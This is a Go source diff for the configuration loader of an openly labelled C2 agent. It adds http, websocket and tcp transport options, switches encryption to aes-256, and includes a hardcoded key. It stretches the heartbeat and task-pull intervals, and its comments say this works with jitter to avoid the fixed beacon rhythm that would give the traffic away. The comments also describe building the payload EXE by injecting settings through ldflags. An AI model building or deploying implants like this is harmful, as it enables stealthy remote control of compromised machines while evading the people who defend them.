@@ -21,23 +21,29 @@ type Config struct {
 	HeartbeatSec int
 	PullInterval int
 	ClientID     string
+	Protocol     string // 通信协议: http | websocket | tcp
+	AgentTCPPort string // TCP Agent 端口（仅 Protocol=tcp 时使用）
 }
 
 // 包级变量：通过 go build -ldflags "-X 'main.C2Server=...' -X 'main.EncAlgo=...' -X 'main.EncPassword=...'" 注入
 // 优先级最高：ldflags 注入 > 环境变量 > 命令行参数 > 硬编码默认值
 var (
-	C2Server    string
-	EncAlgo     string
-	EncPassword string
+	C2Server     string
+	EncAlgo      string
+	EncPassword  string
+	Protocol     string
+	AgentTCPPort string
 )
 
 func loadConfig() *Config {
 	c := &Config{
-		C2Server:     "http://127.0.0.1:5000",
-		EncAlgo:      "aes-128-cbc",
+		C2Server:     "http://127.0.0.1:8443",
+		EncAlgo:      "aes-256-cbc",
 		EncPassword:  "C2DemoKey2024!!!",
-		HeartbeatSec: 30, // 与 agent.py main 循环实际行为一致(每30秒重新心跳)
-		PullInterval: 3,
+		HeartbeatSec: 45, // 心跳间隔加大，配合抖动避免固定节奏
+		PullInterval: 10, // 拉取间隔加大（3秒太频繁，正常软件不会如此），配合抖动
+		Protocol:     "http",   // 默认 HTTP
+		AgentTCPPort: "28443",  // 默认 TCP Agent 端口
 	}
 	// ldflags 注入优先级最高（生成 EXE 时由 payload_gen.go 通过 -X 设置）
 	if C2Server != "" {
@@ -49,6 +55,12 @@ func loadConfig() *Config {
 	if EncPassword != "" {
 		c.EncPassword = EncPassword
 	}
+	if Protocol != "" {
+		c.Protocol = Protocol
+	}
+	if AgentTCPPort != "" {
+		c.AgentTCPPort = AgentTCPPort
+	}
 	// 环境变量次之（用于 go run 或未注入场景）
 	if v := os.Getenv("C2_SERVER"); v != "" {
 		c.C2Server = v
@@ -59,12 +71,20 @@ func loadConfig() *Config {
 	if v := os.Getenv("C2_ENC_PASSWORD"); v != "" {
 		c.EncPassword = v
 	}
+	if v := os.Getenv("C2_PROTOCOL"); v != "" {
+		c.Protocol = v
+	}
+	if v := os.Getenv("C2_AGENT_TCP_PORT"); v != "" {
+		c.AgentTCPPort = v
+	}
 	// 命令行参数（覆盖环境变量）
 	flag.StringVar(&c.C2Server, "server", c.C2Server, "C2 服务器地址 (例: http://1.2.3.4:5000)")
 	flag.StringVar(&c.EncAlgo, "enc-algo", c.EncAlgo, "加密算法: none|aes-128-cbc|aes-256-cbc|xor|rc4|chacha20")
 	flag.StringVar(&c.EncPassword, "enc-password", c.EncPassword, "加密密码")
 	flag.IntVar(&c.HeartbeatSec, "heartbeat", c.HeartbeatSec, "心跳间隔(秒)")
 	flag.IntVar(&c.PullInterval, "pull-interval", c.PullInterval, "任务拉取间隔(秒)")
+	flag.StringVar(&c.Protocol, "protocol", c.Protocol, "通信协议: http|websocket|tcp")
+	flag.StringVar(&c.AgentTCPPort, "tcp-port", c.AgentTCPPort, "TCP Agent 端口")
 	flag.Parse()
 	c.ClientID = computeClientID()
 	return c
